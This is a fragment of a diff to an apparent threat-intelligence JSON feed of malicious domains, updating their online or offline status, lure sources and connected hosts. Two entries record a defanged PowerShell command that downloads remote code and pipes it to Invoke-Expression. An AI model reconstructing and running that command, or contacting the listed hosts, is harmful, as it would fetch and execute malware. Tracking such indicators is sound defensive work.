-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "onthewave.it",
@@ -174855,7 +174801,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "nt5msobo.wostu.store"
    ],
    "lure_from": []
   },
@@ -179566,7 +179513,7 @@
    "hosts": [
     {
      "host": "pk88vn.dev",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -188682,7 +188629,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "q416i3fd.wostu.store"
    ],
    "lure_from": []
   },
@@ -204014,7 +203962,7 @@
    "hosts": [
     {
      "host": "seguridadalcivar.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-31"
     }
@@ -225551,7 +225499,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "tbcitdepot.com",
@@ -230865,7 +230815,7 @@
    "status": "online",
    "first_seen": "2026-10-17",
    "last_seen": "2026-10-19",
-   "last_online": "2026-11-06",
+   "last_online": "2026-11-07",
    "offline_since": null,
    "url": "https://thesignmakeraz.com/",
    "brand": null,
@@ -242505,7 +242455,7 @@
    "hosts": [
     {
      "host": "urbancompass.org",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -253880,7 +253830,7 @@
    "hosts": [
     {
      "host": "wordforward.org",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-21",
      "last_seen": "2026-10-21"
     }
@@ -257859,7 +257809,7 @@
    "hosts": [
     {
      "host": "yatco-yatch.xyz",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-27"
     }
@@ -260748,7 +260698,7 @@
    "hosts": [
     {
      "host": "zeus138.io",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
